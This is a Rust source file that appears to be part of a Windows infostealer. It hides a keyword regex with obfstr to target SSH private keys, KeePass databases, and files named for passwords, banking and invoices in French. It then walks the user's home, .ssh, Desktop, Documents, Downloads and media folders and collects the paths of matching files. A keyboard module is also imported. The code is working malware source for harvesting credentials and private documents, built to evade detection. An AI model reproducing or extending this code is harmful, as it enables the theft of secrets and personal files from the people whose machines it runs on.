use std::{collections::HashSet, path::{Path, PathBuf}};
use std::{env, task::Waker};
use tokio::fs::{read_dir, File};
use tokio::prelude::*;
use walkdir::WalkDir;
use winapi::um::knownfolders as kf;

use crate::utils::get_folder_path;

use super::keyboard;
use regex::Regex;

lazy_static! {
    pub static ref DEFAULT_KEYWORDS_REGEX: Regex = {
        Regex::new(obfstr::obfstr!(r"(?:releve)|(?:banque)|(?:important)|(?:password)|(?:motdepasse)|(?:motsdepasses)|(?:mdp)|(?:motsdepasse)|(?:.kdbx)|(?:id_rsa)|(?:id_dsa)|(?:id_ecdsa)|(?:id_ecdsa_sk)|(?:id_ed25519)|(?:id_ed25519)|(?:facture)|(?:\.pdf)|(?:\.doc*)|(?:\.odt)")).unwrap()
    };
}

pub fn collect_filenames_from_main_dirs(contains: Option<&Regex>) -> Option<Vec<String>> {
    let sysdirs = [
        kf::FOLDERID_Desktop,
        kf::FOLDERID_Documents,
        kf::FOLDERID_Downloads,
        kf::FOLDERID_Pictures,
        kf::FOLDERID_Videos,
        kf::FOLDERID_Music,
    ];

    let mut paths = Vec::new();

    for dir in sysdirs.iter() {
        if let Ok(mut path) = get_folder_path(dir) {
            if !paths.contains(&path) {
                paths.push(path.clone());
            }
        }
    }

    let mut files = Vec::new();

    if let Ok(home_dir) = env::var(obfstr::obfstr!("USERPROFILE")) {
        list_files_in_dir(&(home_dir.clone() + obfstr::obfstr!(r"\.ssh")), contains, &mut files, 10);
        list_files_in_dir(&home_dir, contains, &mut files, 0);
    }

    
    for path in paths {
        list_files_in_dir(&path, contains, &mut files, 5);
    }

    println!("DEBUG: recolted files: {:#?}", files);

    Some(files)
}

pub fn list_files_in_dir<T: AsRef<Path>>(
    path: T,
    contains: Option<&Regex>,
    files: &mut Vec<String>,
    depth: usize,
) -> Option<()> {
    for entry in WalkDir::new(path).max_depth(depth).follow_links(true) {
        if let Ok(entry) = entry {
            let mut add_file = true;
            // check if contains keyword, skip if not
            if let Some(contains) = contains {
                add_file = false;
                if contains.is_match(&entry.path().to_string_lossy()) {
                    add_file = true;
                }
            }

            if add_file && entry.path().is_file() {
                files.push(entry.path().to_path_buf().to_string_lossy().to_string());
            }
        }
    }

    Some(())
}
